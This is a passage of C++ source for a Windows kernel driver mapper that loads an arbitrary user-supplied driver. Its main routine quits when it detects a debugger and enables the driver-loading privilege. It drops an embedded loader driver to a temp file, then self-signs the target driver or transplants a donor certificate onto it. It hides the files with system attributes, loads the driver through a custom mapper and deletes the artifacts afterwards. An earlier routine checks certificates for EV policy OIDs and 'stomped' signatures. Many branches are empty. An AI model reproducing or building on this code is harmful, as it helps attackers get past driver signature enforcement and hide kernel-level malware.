                            "1.3.6.1.4.1.6449.2.1.1",
                            "1.3.6.1.4.1.6449.1.2.1.5.1",
                            "1.3.6.1.4.1.44947.1.1.1",
                            "2.16.840.1.114028.10.1.2",
                            "1.3.6.1.4.1.14370.1.6",
                            "1.3.6.1.4.1.4788.2.202.1",
                            "2.16.840.1.114413.1.7.23.3",
                            "1.3.6.1.4.1.8024.0.2.100.1.2",
                            "2.16.756.1.89.1.2.1.1",
                            "2.16.840.1.114412.2.1",
                            "2.16.840.1.114412.3.2",
                            "1.3.6.1.4.1.4146.1.1",
                            "1.2.616.1.113527.2.5.1.1",
                            "1.3.171.1.1.10.5.2",
                            "1.3.6.1.4.1.34697.2.1",
                            "1.3.6.1.4.1.40869.1.1.22.3",
                            "2.16.840.1.114171.500.9",
                            "2.16.578.1.26.1.3.3",
                            "1.3.6.1.4.1.17326.10.14.2.1.2",
                            "1.3.6.1.4.1.22234.2.5.2.3.1",
                            "2.16.840.1.114404.1.1.2.4.1",
                            "1.3.6.1.4.1.23223.1.1.1",
                        };

                        for (DWORD e = 0; e < chain->cElement && !isEV; e++) {
                            PCCERT_CONTEXT cert = chain->rgpElement[e]->pCertContext;
                            PCERT_EXTENSION pExt = CertFindExtension(
                                szOID_CERT_POLICIES,
                                cert->pCertInfo->cExtension,
                                cert->pCertInfo->rgExtension);
                            if (pExt) {
                                CERT_POLICIES_INFO* polInfo = nullptr;
                                DWORD cbDecoded = 0;
                                if (CryptDecodeObjectEx(
                                    X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
                                    X509_CERT_POLICIES,
                                    pExt->Value.pbData,
                                    pExt->Value.cbData,
                                    CRYPT_DECODE_ALLOC_FLAG,
                                    nullptr,
                                    &polInfo,
                                    &cbDecoded) && polInfo) {
                                    for (DWORD p = 0; p < polInfo->cPolicyInfo && !isEV; p++) {
                                        for (int oid = 0; oid < sizeof(evOIDs) / sizeof(evOIDs[0]); oid++) {
                                            if (strcmp(polInfo->rgPolicyInfo[p].pszPolicyIdentifier, evOIDs[oid]) == 0) {
                                                isEV = TRUE;
                                                break;
                                            }
                                        }
                                    }
                                    LocalFree(polInfo);
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    if (hasCert) {
        if (isStomped) {
        } else {
        }
        if (hasTimestamp)
        if (lStatus == ERROR_SUCCESS) {
        } else {
        }

        if (signerNameA[0]) {
            MultiByteToWideChar(CP_ACP, 0, signerNameA, -1, g_DonorSignerName, 256);
        }
    } else {
    }

    trustData.dwStateAction = WTD_STATEACTION_CLOSE;
    WinVerifyTrust(NULL, &actionGUID, &trustData);

    if (g_KernelSigningVerified) {
    }
    if (hasCert && isStomped) {
        if (lStatus == ERROR_SUCCESS) {
        }
    } else if (hasCert) {
    }
}

int main(int argc, char* argv[]) {
#ifndef _DEBUG
    if (AntiDetect::IsBeingDebugged()) {
        return 1;
    }
#endif

    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        TOKEN_PRIVILEGES tp;
        LUID luid;
        if (LookupPrivilegeValue(NULL, SE_LOAD_DRIVER_NAME, &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
                CloseHandle(hToken);
                return 1;
            }
        }
        CloseHandle(hToken);
    }

    if (argc < 2) {
        return 1;
    }

    if (!Utils::InitializeNtFunctions()) {
        return 1;
    }

    if (!InitializeDriverData()) {
        return 1;
    }

    std::wstring driverArg;
    {
        size_t argLen = strlen(argv[1]);
        int wideLen = MultiByteToWideChar(CP_ACP, 0, argv[1], -1, nullptr, 0);
        if (wideLen <= 0) {
            ReleaseDriverData();
            return 1;
        }
        driverArg.resize(static_cast<size_t>(wideLen));
        MultiByteToWideChar(CP_ACP, 0, argv[1], -1, &driverArg[0], wideLen);
        driverArg.resize(wcslen(driverArg.c_str()));
    }


    std::wstring sentinelArg;
    if (argc >= 3) {
        int wideLen = MultiByteToWideChar(CP_ACP, 0, argv[2], -1, nullptr, 0);
        if (wideLen > 0) {
            sentinelArg.resize(static_cast<size_t>(wideLen));
            MultiByteToWideChar(CP_ACP, 0, argv[2], -1, &sentinelArg[0], wideLen);
            sentinelArg.resize(wcslen(sentinelArg.c_str()));
        }
    }

    if (g_P2CDriverSize == 0) {
        ReleaseDriverData();
        return 1;
    }
    std::wstring loaderFilePath = Utils::GetTempFilePath(L".sys");
    std::wstring driverFilePath = Utils::GetTempFilePath(L".sys");

    if (loaderFilePath.empty() || driverFilePath.empty()) {
        ReleaseDriverData();
        return 1;
    }

    HANDLE loaderFile = CreateFileW(
        loaderFilePath.c_str(),
        GENERIC_WRITE,
        0,
        nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_SEQUENTIAL_SCAN,
        nullptr
    );

    if (loaderFile == INVALID_HANDLE_VALUE) {
        ReleaseDriverData();
        return 1;
    }

    DWORD written = 0;
    DWORD expectedSize = static_cast<DWORD>(g_P2CDriverSize);
    BOOL writeOk = WriteFile(loaderFile, g_P2CDriverData, expectedSize, &written, nullptr);
    DWORD writeErr = GetLastError();
    FlushFileBuffers(loaderFile);
    CloseHandle(loaderFile);

    ReleaseDriverData();

    if (!writeOk || written != expectedSize) {
        Utils::SecureDeleteFile(loaderFilePath.c_str());
        return 1;
    }
    if (!CopyFileW(driverArg.c_str(), driverFilePath.c_str(), FALSE)) {
        Utils::ForceDeleteOrRename(loaderFilePath.c_str());
        return 1;
    }


    std::wstring sentinelFilePath;
    if (!sentinelArg.empty()) {
        sentinelFilePath = Utils::GetTempFilePath(L".sys");
        if (sentinelFilePath.empty()) {
            Utils::ForceDeleteOrRename(loaderFilePath.c_str());
            Utils::ForceDeleteOrRename(driverFilePath.c_str());
            return 1;
        }
        if (!CopyFileW(sentinelArg.c_str(), sentinelFilePath.c_str(), FALSE)) {
            Utils::ForceDeleteOrRename(loaderFilePath.c_str());
            Utils::ForceDeleteOrRename(driverFilePath.c_str());
            return 1;
        }

        if (!SignedMemory::SelfSignDriver(sentinelFilePath.c_str())) {
            SignedMemory::TransplantCertificateToDriver(sentinelFilePath.c_str());
        }
        SetFileAttributesW(sentinelFilePath.c_str(),
                           FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
    }

    if (!SignedMemory::SelfSignDriver(driverFilePath.c_str())) {
        SignedMemory::TransplantCertificateToDriver(driverFilePath.c_str());
    }

    SetFileAttributesW(driverFilePath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);

    NTSTATUS status = MapperCore::WindLoadDriver(
        loaderFilePath.c_str(),
        driverFilePath.c_str(),
        sentinelFilePath.empty() ? nullptr : sentinelFilePath.c_str());

    if (NT_SUCCESS(status)) {
        RunSignatureCheck(driverFilePath.c_str());
    }

    Utils::ForceDeleteOrRename(loaderFilePath.c_str());
    Utils::ForceDeleteOrRename(driverFilePath.c_str());
    if (!sentinelFilePath.empty())
        Utils::ForceDeleteOrRename(sentinelFilePath.c_str());

    MapperCore::CleanupArtifacts();

    if (NT_SUCCESS(status)) {
        if (g_SentinelLoadAddress) {
        }
        if (g_DonorCopyPath[0]) {
        }
    } else {
    }

    return NT_SUCCESS(status) ? 0 : 1;
}
